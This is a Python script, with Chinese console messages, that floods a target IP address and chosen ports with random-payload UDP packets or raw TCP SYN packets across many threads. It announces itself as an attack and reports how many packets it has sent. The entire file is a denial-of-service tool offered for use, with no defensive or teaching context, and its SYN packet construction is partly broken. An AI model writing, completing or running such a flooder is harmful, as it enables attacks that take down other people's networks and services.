import os
import sys
import time
import socket
import random
import threading
import struct

def send_packets(ip, ports, packet_types, threads):
    family = socket.AF_INET6 if ':' in ip else socket.AF_INET
    counter = 0
    lock = threading.Lock()
    running = True
    sockets = []

    def create_syn_packet():
        src_port = random.randint(1024, 65535)
        dst_port = random.choice(ports)
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        data_offset = 5 << 4
        flags = 0x02
        window = socket.htons(5840)
        checksum = 0
        urg_ptr = 0

        if family == socket.AF_INET:
            src_addr = socket.inet_pton(socket.AF_INET, '0.0.0.0')
            dst_addr = socket.inet_pton(socket.AF_INET, ip)
            protocol = socket.IPPROTO_TCP
            tcp_length = 20

            pseudo_header = struct.pack('!4s4sBBH',
                                        src_addr,
                                        dst_addr,
                                        0,
                                        protocol,
                                        tcp_length)

        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port,
                                 dst_port,
                                 seq_num,
                                 ack_num,
                                 data_offset,
                                 flags,
                                 window,
                                 checksum,
                                 urg_ptr)
        return tcp_header

    def create_udp_packet():
        return random._urandom(1490)

    def attack_port(port):
        nonlocal counter
        try:
            sock = socket.socket(family, socket.SOCK_DGRAM if 'udp' in packet_types else socket.SOCK_RAW)
            sockets.append(sock)

            while running:
                try:
                    for ptype in packet_types:
                        if ptype == 'udp':
                            packet = create_udp_packet()
                            sock.sendto(packet, (ip, port))
                        elif ptype == 'syn':
                            packet = create_syn_packet()
                            sock.sendto(packet, (ip, port))

                        with lock:
                            counter += 1
                            if counter % 100 == 0:
                                ports_str = ','.join(map(str, ports))
                                types_str = ','.join(packet_types)
                                print(f"已发送 {counter} 个 {types_str} 数据包到 IP: {ip} 的端口: {ports_str}", end="\r")

                    time.sleep(0)  # 速度固定为 1000
                except socket.error as e:
                    print(f"\n网络错误: {e}")
                    break
                except Exception as e:
                    print(f"\n未知错误: {e}")
                    break
        except Exception as e:
            print(f"\n创建socket错误: {e}")

    print(f"\n[攻击信息]")
    print('-' * 50)
    print(f"目标IP: {ip}")
    print(f"IP类型: {'IPv6' if ':' in ip else 'IPv4'}")
    print(f"攻击速度: 1000")
    print(f"攻击端口: {ports}")
    print(f"线程数量: {threads}")
    print(f"包类型: {packet_types}")
    print('-' * 50)
    print("\n正在攻击...\n")

    try:
        threads_per_port = max(1, threads // len(ports))
        for port in ports:
            for _ in range(threads_per_port):
                thread = threading.Thread(target=attack_port, args=(port,))
                thread.daemon = True
                thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            running = False
            print("\n正在停止攻击...")
            time.sleep(1)
    finally:
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

        print(f"\n攻击已停止")
        print(f"总共发送了 {counter} 个数据包")